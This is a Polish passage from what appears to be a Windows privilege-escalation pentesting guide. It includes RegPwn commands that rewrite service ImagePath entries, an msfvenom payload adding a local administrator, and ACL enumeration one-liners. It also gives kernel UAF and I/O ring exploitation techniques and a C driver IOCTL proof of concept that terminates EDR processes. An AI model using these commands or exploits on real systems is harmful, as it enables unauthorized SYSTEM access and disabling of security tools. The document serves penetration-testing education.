Niektóre funkcje ułatwień dostępu systemu Windows tworzą klucze **ATConfig** dla poszczególnych użytkowników, które są później kopiowane przez proces **SYSTEM** do klucza sesji HKLM. **Race condition** związany z **linkiem symbolicznym** w rejestrze może przekierować ten uprzywilejowany zapis do **dowolnej ścieżki HKLM**, zapewniając możliwość zapisu dowolnej **wartości HKLM**.<sup>[[18]](#references)</sup>

Lokalizacje kluczy (przykład: Klawiatura ekranowa `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` zawiera listę zainstalowanych funkcji ułatwień dostępu.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` przechowuje kontrolowaną przez użytkownika konfigurację.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` jest tworzony podczas logowania/przejść do bezpiecznego pulpitu i jest zapisywalny przez użytkownika.

Przebieg ataku (CVE-2026-24291 / ATConfig):

1. Ustaw w **HKCU ATConfig** wartość, która ma zostać zapisana przez SYSTEM.
2. Wywołaj kopiowanie na bezpieczny pulpit (np. **LockWorkstation**), co rozpoczyna przepływ AT broker.
3. **Wygraj race**, ustawiając **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; gdy oplock zostanie wyzwolony, zastąp klucz **HKLM Session ATConfig** **linkiem rejestru** wskazującym na chroniony cel HKLM.
4. SYSTEM zapisuje wybraną przez atakującego wartość w przekierowanej ścieżce HKLM.

Po uzyskaniu możliwości zapisu dowolnej wartości HKLM przejdź do LPE, nadpisując wartości konfiguracji usługi:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/wiersz poleceń)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wybierz usługę, którą może uruchomić zwykły użytkownik (np. **`msiserver`**) i uruchom ją po zapisie. **Uwaga:** publiczna implementacja exploita **blokuje stację roboczą** w ramach race.

Przykładowe narzędzia (RegPwn BOF / samodzielne):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Uprawnienia AppendData/AddSubdirectory w rejestrze usług

Jeśli masz takie uprawnienie do rejestru, oznacza to, że **możesz tworzyć podrejestry w jego obrębie**. W przypadku usług Windows to **wystarczy, aby wykonać dowolny kod:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Jeśli ścieżka do pliku wykonywalnego nie jest ujęta w cudzysłowy, Windows spróbuje uruchomić każdy człon ścieżki kończący się przed spacją.

Na przykład dla ścieżki _C:\Program Files\Some Folder\Service.exe_ Windows spróbuje uruchomić:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Wyświetl wszystkie ścieżki usług nieujęte w cudzysłów, z wyłączeniem ścieżek należących do wbudowanych usług systemu Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Możesz wykryć tę podatność i ją wykorzystać za pomocą metasploit:** `exploit/windows/local/trusted\_service\_path` Możesz ręcznie utworzyć plik binarny usługi za pomocą metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Akcje odzyskiwania

Windows pozwala użytkownikom określić działania podejmowane w przypadku awarii usługi. Tę funkcję można skonfigurować tak, aby wskazywała plik binarny. Jeśli można go podmienić, eskalacja uprawnień może być możliwa. Więcej informacji znajduje się w [oficjalnej dokumentacji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Skrypty wskazywane przez zaplanowane zadania

W przypadku włączonego zadania, które uruchamia `cmd.exe /c` z plikiem `.bat` lub `.cmd`, sprawdź skrypt wskazany w **argumentach akcji**, a także `cmd.exe`. To samo dotyczy jawnego argumentu plikowego interpretera, takiego jak `-File` w PowerShell. Jeśli zaplanowany plik wsadowy zawiera dosłowne wywołanie PowerShell `-File`, sprawdź również ACL wskazanego skryptu; zmienne, instrukcje warunkowe i łączenie poleceń wymagają ręcznego prześledzenia. Możliwość zapisu do skryptu lub jego katalogu nadrzędnego przez inne konto wskazuje na potencjalne wykonanie między kontami tylko wtedy, gdy skonfigurowany podmiot zadania różni się od bieżącego użytkownika, a zadanie faktycznie dociera do tej akcji. ACL zezwalający wyłącznie na dopisywanie może mieć znaczenie w przypadku skryptów, ale wcześniejsze `exit` lub inny przepływ sterowania może sprawić, że dopisane wiersze będą nieosiągalne. Zanim stwierdzisz, że możliwa jest eskalacja, zweryfikuj efektywne ACL, [kontekst wykonywania zadania](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), katalog roboczy, wyzwalacz i zasady kontroli aplikacji. Inwentaryzacja nie powinna modyfikować skryptu ani uruchamiać zadania.

## Nazwane strumienie w dostępnych plikach

W systemie plików NTFS czytelny plik może zawierać nazwany strumień `:$DATA`, którego zawartość nie jest widoczna podczas zwykłego wyświetlania katalogu. W przypadku niewielkiego, istotnego zbioru dostępnych kopii zapasowych lub plików konfiguracyjnych przed otwarciem zawartości sprawdź **nazwy i rozmiary** strumieni; Windows udostępnia je za pomocą [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) oraz polecenia PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Nazwa strumienia sugerująca obecność sekretu jest jedynie wskazówką. Sprawdź efektywne uprawnienia do odczytu pliku, obsługę strumieni przez system plików, to, czy strumień zawiera użyteczne dane uwierzytelniające, oraz konto, na które te dane faktycznie pozwalają się uwierzytelnić. Podczas rutynowej enumeracji unikaj rekurencyjnego skanowania strumieni i wyświetlania ich zawartości.

## Dane wejściowe pomocnika Windows Driver Kit uruchamianego przez harmonogram

Opcjonalny Windows Driver Kit zawiera `StandaloneRunner.exe`, który może korzystać z plików `command.txt`, `reboot.rsf` oraz pliku projektu `working\rsf.rsf` znajdujących się w katalogu uruchomieniowym. Zaplanowane zadanie lub usługa uruchamiająca ten program pomocniczy z uprzywilejowanym kontem może umożliwić wykonanie poleceń w kontekście tego konta dzięki uprawnieniom niskiego poziomu do zapisu w tych plikach wejściowych — nawet jeśli sam plik wykonywalny jest chroniony. Potwierdź, że program jest uruchamiany przez uprzywilejowane konto oraz że **oba** pliki pomocnicze można utworzyć lub zmodyfikować; samo znalezienie programu nie wystarczy.

W przypadku zaplanowanego zadania sprawdź jego akcję [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) oraz ACL dwóch ścieżek plików pomocniczych. Jeśli zadanie nie określa katalogu roboczego, katalog pliku wykonywalnego jest tylko wskazówką do zweryfikowania, a nie dowodem na to, skąd zadanie odczytuje dane wejściowe. Musi być również spełniony warunek dotyczący pliku projektu. Sprawdź faktyczny podmiot zadania, zamiast zakładać, że działa ono jako SYSTEM.

## Aplikacje

### Zainstalowane aplikacje

Sprawdź **uprawnienia do plików binarnych** (być może możesz nadpisać jeden z nich i eskalować uprawnienia) oraz do **folderów** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Ścieżka naprawy agenta Checkmk w Windows

[CVE-2024-0670](https://checkmk.com/werk/16361) dotyczy starszych agentów Checkmk w Windows, które zapisywały pliki poleceń w `C:\Windows\Temp`, a następnie uruchamiały istniejący wcześniej plik chroniony przed zapisem, gdy jego zastąpienie się nie powiodło. Dostawca naprawił problem w wersjach 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Sprawdź pełny zainstalowany poziom poprawek oraz to, czy może zostać wykonana podatna operacja agenta; sama etykieta gałęzi, taka jak `2.1`, nie pozwala stwierdzić, czy system jest podatny. Podczas enumeracji można sprawdzić wersję, stan usługi i uprawnienia do katalogu Temp bez tworzenia plików ani uruchamiania poleceń agenta.

#### Weryfikacja usługi SAML ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) dotyczyła kompilacji ADSelfService Plus 6210 i wcześniejszych; dostawca naprawił problem w kompilacji 6211. Ma ona znaczenie tylko wtedy, gdy SAML SSO **jest lub było** włączone. Wpis dotyczący zainstalowanego produktu lub ścieżka usługi to zatem wskazówka, a nie potwierdzenie podatności: sprawdź dokładną kompilację, historię konfiguracji SAML, dostępność usługi z sieci oraz konto, na którym działa. Wykonanie kodu za pośrednictwem usługi odbywa się z uprawnieniami tego konta; wykonanie jako SYSTEM wymaga instancji uruchomionej jako SYSTEM. Możliwy do odczytania plik `OfflineBackup_*.ezip` w katalogu Backup produktu to osobna wskazówka dotycząca zaszyfrowanej kopii zapasowej, a nie dowód na dostępność użytecznych danych uwierzytelniających ani na tę podatność SAML. Podczas rutynowej enumeracji zapisz jego ścieżkę i uprawnienia dostępu, ale go nie rozpakowuj.

#### Granice uprawnień kontrolera Jenkins i kont domenowych

Na kontrolerze Jenkins w Windows rozróżnij uprawnienia do tworzenia lub konfigurowania zadania od uprawnień do jego uruchamiania: [Jenkins dokumentuje je jako osobne uprawnienia `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Skonfigurowany harmonogram lub zdalny wyzwalacz mogą zapewniać inną drogę uruchomienia kompilacji, ale sprawdź, czy są włączone i czy kompilacja faktycznie się wykonuje. Kod działa z tożsamością kontrolera lub wybranego agenta, a zapisane dane uwierzytelniające są dostępne tylko wtedy, gdy zadanie ma dostęp do ich zakresu. Osobno sprawdź dostęp do metadanych `JENKINS_HOME`: Jenkins przechowuje dane uwierzytelniające i klucze szyfrujące w plikach `credentials.xml`, `secrets/hudson.util.Secret` i `secrets/master.key` ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). Sama ich obecność nie ujawnia hasła; sprawdź **uprawnienia do odczytu wymaganych plików** oraz odrębną możliwość ponownego użycia konta. Nie wyświetlaj sekretów we współdzielonych wynikach. Jeśli to konto ma prawo zapisu do atrybutu `scriptPath` obiektu użytkownika AD, sprawdź, czy ścieżka skryptu jest zapisywalna i czy istnieje rzeczywiste logowanie lub zaplanowany proces, który uruchamia skrypt jako użytkownik docelowy, zanim uznasz to za wykonanie kodu w kontekście innego użytkownika. Dalszą kontrolę nad grupą należy potwierdzić osobno, weryfikując efektywne uprawnienia AD.

#### Tożsamość agenta Azure Pipelines self-hosted

W przypadku Azure DevOps Server lub projektu Azure Pipelines rozróżnij uprawnienia do **tworzenia lub edytowania** pipeline’u od uprawnień do **dodawania go do kolejki** i korzystania z wybranej puli agentów; [Microsoft dokumentuje uprawnienia pipeline’ów](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) oraz [autoryzację puli](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) osobno. Jeśli konto o niższych uprawnieniach może przesłać krok skryptu i uruchomić ten pipeline na agencie Windows self-hosted, krok jest wykonywany jako [skonfigurowane konto systemu operacyjnego agenta](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Zanim stwierdzisz, że doszło do przejścia między użytkownikami lub uzyskania uprawnień SYSTEM, sprawdź konkretny pipeline, ograniczenia dotyczące gałęzi i zasobów, autoryzowaną pulę, zadanie możliwe do uruchomienia oraz tożsamość usługi agenta. Zainstalowany agent, rola w projekcie lub sam dostęp do zapisu w repozytorium to tylko wskazówki; podczas pasywnej enumeracji sprawdź uprawnienia i lokalne metadane usługi, ale nie uruchamiaj kompilacji.

#### Dane uwierzytelniające Microsoft Entra Connect Sync

[Microsoft rozróżnia](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **konto usługi ADSync**, na którym działa usługa synchronizacji i które uzyskuje dostęp do jej bazy danych SQL, od **konta konektora AD DS**, którego uprawnienia w katalogu zależą od skonfigurowanych funkcji synchronizacji. Dane uwierzytelniające konektora są przechowywane w tej bazie danych w postaci zaszyfrowanej, a materiał klucza jest [chroniony przez DPAPI w kontekście konta usługi ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Sama zainstalowana usługa synchronizacji, grupa o nazwie sugerującej uprawnienia administratora lokalnego lub widoczność bazy danych nie potwierdzają, że da się odszyfrować dane uwierzytelniające ani uzyskać uprawnienia w domenie. Osobno sprawdź rzeczywiste uprawnienia do odczytu bazy danych, dostęp konta usługi do klucza, układ instalacji i SQL, skonfigurowaną tożsamość konektora oraz efektywne uprawnienia tej tożsamości w AD. Podczas rutynowej enumeracji wyświetlaj wyłącznie metadane usługi i dostępu; nie odpytuj ani nie wyświetlaj zapisanych sekretów.

#### Uprawnienia do bibliotek DLL obsługi sterownika drukarki

Zainstalowany sterownik drukarki może przechowywać biblioteki DLL obsługi w `C:\ProgramData` i ładować je w bardziej uprzywilejowanym procesie drukowania. Sprawdź ACL dokładnego katalogu sterownika i bibliotek DLL, w tym katalogów nadrzędnych i punktów ponownej analizy, nawet jeśli enumeracja drukarek za pomocą WMI jest niedostępna. W przypadku [problemu ze sterownikiem drukarki Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) zgłoszona ścieżka to `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [oryginalny opis](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) opisuje ładowanie bibliotek DLL przez `PrintIsolationHost.exe`. Zapisowalny ACL to tylko wskazówka: sprawdź efektywne uprawnienia do zapisu po uwzględnieniu wpisów odmowy, czy odpowiedni sterownik jest zainstalowany i ładuje plik w kontekście uprzywilejowanej tożsamości, a także czy problem został naprawiony w zaktualizowanym sterowniku lub programie zabezpieczeń dostawcy. Nie wnioskuj o podatności wyłącznie na podstawie nazwy katalogu lub wersji sterownika.

### Uprawnienia do zapisu

Sprawdź, czy możesz zmodyfikować jakiś plik konfiguracyjny, aby odczytać specjalny plik, albo czy możesz zmodyfikować plik binarny uruchamiany przez konto Administratora (schedtasks).

Słabe uprawnienia do folderów i plików w systemie można znaleźć w następujący sposób:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Trwałość/wykonywanie przez automatyczne ładowanie wtyczek Notepad++

Notepad++ automatycznie ładuje dowolne biblioteki DLL w podfolderach `plugins`. Jeśli dostępna jest zapisywalna instalacja przenośna/kopia, umieszczenie złośliwej wtyczki zapewnia automatyczne wykonanie kodu w procesie `notepad++.exe` przy każdym uruchomieniu (w tym z poziomu `DllMain` i funkcji zwrotnych wtyczki).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Uruchamianie przy starcie

**Sprawdź, czy możesz nadpisać wpis rejestru lub plik binarny, który zostanie uruchomiony przez innego użytkownika.**\
**Przeczytaj** **poniższą stronę**, aby dowiedzieć się więcej o interesujących **lokalizacjach autostartu umożliwiających eskalację uprawnień**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sterowniki

Szukaj potencjalnych **dziwnych/podatnych na ataki sterowników innych firm**.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Jeśli sterownik udostępnia prymityw dowolnego odczytu/zapisu w kernelu (co jest częste w źle zaprojektowanych handlerach IOCTL), możesz eskalować uprawnienia, bezpośrednio kradnąc token SYSTEM z pamięci kernela.<sup>[[13]](#references)</sup> Opis techniki krok po kroku znajdziesz tutaj:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

W przypadku błędów typu race condition, gdy podatne wywołanie otwiera ścieżkę Object Manager kontrolowaną przez atakującego, celowe spowolnienie wyszukiwania (przez użycie komponentów o maksymalnej długości lub głębokich łańcuchów katalogów) może wydłużyć okno z mikrosekund do kilkudziesięciu mikrosekund:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF w kolejkach cancel-safe, ujawnienia z paged pool i wektoryzacja przez I/O ring

Niektóre łańcuchy LPE w jądrze Windows można zbudować z dwóch osobno mało groźnych błędów: **race condition związany z czasem życia obiektu w kolejce cancel-safe**, który zwalnia żądanie/CBD, gdy blokada kolejki jest nadal utrzymywana, oraz ujawnienia typu **zwolnienie blokady przed kopiowaniem**, które ujawnia zwolnioną alokację paged pool podczas `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Notatki dotyczące audytu i wykorzystania:

- **Zwolnienie pod blokadą, a następnie anulowanie**: szukaj ścieżki sukcesu wykonującej **Acquire -> CompleteRequest/free -> Release**, podczas gdy ścieżka anulowania wykonuje **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Jeśli ścieżka sukcesu wywołuje `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` przed zwolnieniem blokady CBDQ/CSQ, wątek zablokowany w `NtCancelIoFileEx -> IopCsqCancelRoutine` może później wznowić działanie i przekazać zwolniony `PFLT_CALLBACK_DATA` do callbacku usuwania sterownika.
- **Odzyskaj zwolniony obiekt kolejki** za pomocą alokacji paged pool o tym samym rozmiarze, kontrolowanej przez atakującego. Wpisy Data Queue Entries `NPFS` są przydatne, ponieważ można kontrolować ich zawartość i rozmiar, a później badać je za pomocą operacji odczytu/peek na pipe. Jeśli zwolniony obiekt zawiera linki listy, nadpisz je **cykliczną listą fałszywych węzłów żądań w pamięci użytkownika**, aby sterownik wielokrotnie przetwarzał struktury żądań zdefiniowane przez atakującego, zamiast zakończyć działanie na pierwotnym początku listy.
- **Ulepsz przewidywalny zapis**: jeśli fałszywe żądanie przekierowuje zagnieżdżony wskaźnik kontekstu używany przez zapisy związane z księgowaniem (znaczniki czasu / QPC / pola sąsiadujące z licznikiem referencji), możesz uzyskać **zapis do kontrolowanego adresu, ale z niekontrolowaną wartością**. W takim przypadku zaatakuj pole **length/size** obiektu ze spryskanego poola zamiast końcowego wskaźnika kodu/danych, a następnie przeszukaj spryskane obiekty, aż uszkodzony obiekt umożliwi **odczyt poza zakresem z paged pool**.
- **Schemat podatnego na race condition ujawnienia**: każdy syscall wykonujący `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` jest dobrym kandydatem. Niezawodność rośnie, gdy atakujący może zwiększyć kopiowany bufor (na przykład przez dodanie wielu wpisów listy/zasobów, które zwiększają końcowy rozmiar alokacji serializatora), ponieważ dłuższe kopiowanie poszerza okno na podmianę bez konieczności zawieszenia działania maszyny.
- **Cele ponownego wypełnienia zawierające wiele wskaźników**: tablice zarejestrowanych buforów **I/O ring** w Windows są doskonałymi celami ujawnienia, ponieważ ich rozmiar w paged pool jest kontrolowany przez atakującego (`8 * regBufferCnt`), a każdy element jest wskaźnikiem kernela do `_IOP_MC_BUFFER_ENTRY`. Ujawnij jedną z tych tablic, odtwórz otaczający ją `IORING_OBJECT`, a następnie uszkodź **`RegBuffers`** i **`RegBuffersCount`**, aby kolejne operacje I/O ring używały sfałszowanych przez atakującego wpisów i zapewniały dowolny odczyt/zapis w kernelu. Jeśli jedyny dostępny zapis pozwala uzyskać stabilny bajt (na przykład z `KUSER_SHARED_DATA+0x14`), użyj **nakładających się, niewyrównanych zapisów**, aby zbudować wskaźnik użytkownika z powtarzającymi się bajtami, taki jak `0x0101010101010101`, zmapuj go za pomocą `VirtualAlloc` i umieść tam sfałszowaną tablicę zarejestrowanych buforów.<sup>[[30]](#references)</sup>

Przydatne wskaźniki diagnostyczne:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Gdy uzyskasz arbitrary kernel read/write z uszkodzonego I/O ring, przejmij token SYSTEM, korzystając ze standardowego workflow po uzyskaniu prymitywu:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Prymitywy korupcji pamięci gałęzi rejestru

Współczesne podatności w gałęziach rejestru pozwalają przygotować deterministyczne układy pamięci, wykorzystać zapisywalne elementy podrzędne HKLM/HKU i przekształcić korupcję metadanych w przepełnienia kernel paged-pool bez niestandardowego sterownika. Pełny łańcuch poznasz tutaj:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Pomylenie typów w trybie bezpośrednim `RtlQueryRegistryValues` ze ścieżkami kontrolowanymi przez atakującego

Niektóre sterowniki akceptują ścieżkę rejestru z userland, sprawdzają jedynie, czy jest poprawnym ciągiem UTF-16, a następnie wywołują `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` z `RTL_QUERY_REGISTRY_DIRECT` i adresem zmiennej skalarnej na stosie, takiej jak `int readValue`. Jeśli brakuje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` jest interpretowane zgodnie z **rzeczywistym** typem rejestru, a nie typem oczekiwanym przez programistę.

Tworzy to dwa przydatne prymitywy:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: kontrolowana przez użytkownika ścieżka bezwzględna `\Registry\...` pozwala sterownikowi odpytywać wybrane przez atakującego klucze, ujawniać ich istnienie za pomocą kodów zwrotnych/logów, a czasem odczytywać wartości, do których wywołujący nie miałby bezpośredniego dostępu.
- **Korupcja pamięci jądra**: miejsce docelowe typu skalarnego, takie jak `&readValue`, może zostać błędnie zinterpretowane jako `REG_QWORD`, `UNICODE_STRING` lub bufor binarny o określonym rozmiarze, zależnie od typu wartości rejestru.

Praktyczne uwagi dotyczące exploita:

- **Zabezpieczenie w Windows 8+**: jeśli zapytanie dotyczy **niezaufanej gałęzi rejestru** z `RTL_QUERY_REGISTRY_DIRECT`, ale bez `RTL_QUERY_REGISTRY_TYPECHECK`, wywołania z jądra powodują awarię `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Aby zachować możliwość exploita, szukaj **kluczy zapisywalnych przez atakującego w zaufanych gałęziach systemowych**, zamiast umieszczać wartości w `HKCU`.
- **Przygotowanie w zaufanej gałęzi rejestru**: użyj NtObjectManager, aby wyliczyć zapisywalne elementy podrzędne `\Registry\Machine`, a następnie ponów skanowanie z powielonym tokenem o **niskim poziomie integralności**, aby znaleźć klucze dostępne z kontekstów sandbox:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: bezpośredni zapis 8 bajtów do 4-bajtowego `int` uszkadza sąsiednie dane na stosie i może częściowo nadpisać pobliski wskaźnik callback/funkcji.
- **`REG_SZ` / `REG_EXPAND_SZ`**: tryb bezpośredni zakłada, że `EntryContext` wskazuje na `UNICODE_STRING`. Jeśli kod najpierw wczytuje kontrolowany przez atakującego `REG_DWORD` do skalarnej zmiennej na stosie, a następnie ponownie używa tego samego bufora do odczytu ciągu, atakujący kontroluje `Length`/`MaximumLength` i częściowo wpływa na wskaźnik `Buffer`, uzyskując częściowo kontrolowany zapis do pamięci jądra.
- **`REG_BINARY`**: w przypadku dużych danych binarnych tryb bezpośredni traktuje pierwszy `LONG` pod adresem `EntryContext` jako rozmiar bufora ze znakiem. Jeśli wcześniejszy odczyt `REG_DWORD` pozostawi ujemną wartość kontrolowaną przez atakującego w ponownie używanej zmiennej skalarnej, następne zapytanie `REG_BINARY` kopiuje bajty atakującego bezpośrednio do sąsiednich slotów na stosie — to często najprostsza droga do pełnego nadpisania wskaźnika callback.

Skuteczna metoda wyszukiwania: **odczyty rejestru różnych typów do tej samej zmiennej na stosie bez jej ponownej inicjalizacji**. Wyszukuj `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponownie używane wskaźniki `EntryContext` oraz ścieżki kodu, w których pierwszy odczyt rejestru decyduje o wykonaniu drugiego.

#### Nadużywanie braku FILE_DEVICE_SECURE_OPEN w obiektach urządzeń (LPE + wyłączenie EDR)

Niektóre podpisane sterowniki firm trzecich tworzą obiekt urządzenia z restrykcyjnym SDDL za pomocą IoCreateDeviceSecure, ale zapominają ustawić FILE_DEVICE_SECURE_OPEN w DeviceCharacteristics. Bez tej flagi bezpieczna DACL nie jest egzekwowana, gdy urządzenie jest otwierane przez ścieżkę zawierającą dodatkowy komponent, co pozwala każdemu nieuprzywilejowanemu użytkownikowi uzyskać uchwyt za pomocą ścieżki przestrzeni nazw, takiej jak:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (z rzeczywistego przypadku)

Gdy użytkownik może już otworzyć urządzenie, może nadużyć uprzywilejowanych IOCTL udostępnianych przez sterownik do LPE i manipulacji. Przykładowe możliwości zaobserwowane w praktyce:
- Zwracanie uchwytów z pełnym dostępem do dowolnych procesów (kradzież tokena / powłoka SYSTEM przez DuplicateTokenEx/CreateProcessAsUser).
- Nieograniczony surowy odczyt/zapis dysku (manipulacja offline, sztuczki z trwałością podczas rozruchu).
- Kończenie dowolnych procesów, w tym Protected Process/Light (PP/PPL), co pozwala wyłączyć AV/EDR z przestrzeni użytkownika za pośrednictwem jądra.

Minimalny wzorzec PoC (tryb użytkownika):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Środki zaradcze dla programistów
- Zawsze ustawiaj FILE_DEVICE_SECURE_OPEN podczas tworzenia obiektów urządzeń, które mają być ograniczone za pomocą DACL.
- Weryfikuj kontekst wywołującego przy operacjach uprzywilejowanych. Przeprowadzaj kontrole PP/PPL, zanim zezwolisz na zakończenie procesu lub zwrócenie uchwytu.
- Ograniczaj IOCTL (maski dostępu, METHOD_*, walidacja danych wejściowych) i rozważ modele brokered zamiast bezpośrednich uprawnień jądra.

Pomysły na wykrywanie dla obrońców
- Monitoruj otwieranie z trybu użytkownika podejrzanych nazw urządzeń (np. \\ .\\amsdk*) oraz konkretne sekwencje IOCTL wskazujące na nadużycie.
- Wymuszaj stosowanie listy zablokowanych podatnych sterowników Microsoftu (HVCI/WDAC/Smart App Control) i utrzymuj własne listy dozwolonych i zablokowanych elementów.


## PATH DLL Hijacking

Jeśli masz **uprawnienia do zapisu w folderze znajdującym się w PATH**, możesz przejąć kontrolę nad biblioteką DLL ładowaną przez proces i **eskalować uprawnienia**.<sup>[[2]](#references)</sup>

Sprawdź uprawnienia do wszystkich folderów w PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

